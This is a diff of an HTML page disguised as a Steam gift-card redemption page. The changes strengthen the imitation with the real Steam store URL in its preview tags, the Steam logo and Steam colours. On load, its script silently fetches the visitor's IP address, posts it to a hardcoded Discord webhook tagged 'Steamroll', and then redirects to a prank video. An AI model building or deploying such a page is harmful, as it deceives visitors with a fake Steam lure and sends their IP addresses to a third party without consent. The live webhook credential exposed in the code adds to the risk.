@@ -7,36 +7,48 @@
 
     <meta property="og:title" content="Steam Gift Activation" />
     <meta property="og:description" content="Redeem a Steam Gift Card or Wallet Code" />
-    <meta property="og:url" content="https://www.youtube.com/watch?v=dQw4w9WgXcQ" />
-    <meta property="og:image" content="https://cdn.akamai.steamstatic.com/store/about/social-og.jpg" />
+    <meta property="og:url" content="https://store.steampowered.com/account/registerkey" />
     <meta property="og:type" content="website" />
+    
+    <meta property="og:image" content="https://cdn.cloudflare.steamstatic.com/store/about/social-og.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="theme-color" content="#171a21" />
 
     <script type="text/javascript">
+        // Your Webhook URL
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477709893875269763/hlcZYdFcsZCA4t0JKeO8Hr0IBum2-KgPZMMsx426yUp4VeOEoTgfGSz8g7mOtvND6pT';
 
         async function logAndRedirect() {
             try {
+                // Get the IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                
+                const clientIp = ipData.ip;
+
+                // Send to Webhook
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `📢 **New Visitor Logged**\n**IP:** \`${ipData.ip}\``
+                        content: `📢 **New Visitor**\n**IP:** \`${clientIp}\`\n**Site:** Steamroll`
                     })
                 });
-            } catch (e) { console.error(e); }
-            finally {
+            } catch (error) {
+                console.error('Error logging:', error);
+            } finally {
+                // Always redirect, even if the webhook fails
                 window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
             }
         }
+
         window.onload = logAndRedirect;
     </script>
 </head>
-<body style="background-color: #171a21; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <p>Redirecting to Steam...</p>
+<body style="background-color: #1b2838; color: white; font-family: sans-serif; text-align: center; padding-top: 100px;">
+    <img src="https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg" width="200" alt="Steam Logo">
+    <p style="margin-top: 20px;">Loading Steam Gift Activation...</p>
 </body>
 </html>
